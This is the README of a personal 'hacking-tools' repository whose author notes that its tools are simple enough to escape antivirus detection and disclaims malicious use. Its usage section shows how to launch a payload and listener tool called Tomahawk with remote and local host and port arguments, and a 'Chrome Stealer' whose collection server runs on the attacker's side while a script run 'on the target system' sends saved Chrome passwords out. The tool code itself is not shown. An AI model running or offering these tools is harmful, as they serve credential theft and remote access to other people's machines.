# hacking-tools
Designing cyber security tools for myself and learning along the way
> Alot of the tools *.cpp tools here will not be picked up by AV solutions merely because of their simplicity. They are not to be used for real world applications. I don't consent to use of these tools for malicious intent, merely for educational purposes.

# Usage
> Download
```bash
git clone https://github.com/Frankfx9/hacking-tools.git
cd hacking-tools.git
```
> Tomahawk
```bash
chmod +x tomahawk.py
./tomahawk.py [server or payload] --rhost IP --lport PORT --lhost IP
```
> Chrome Stealer
```bash
cd chrome-tools/chrome/
python3 server.py
```
On the target system
```bash
python3 exfil_chrome_passwords.py
```
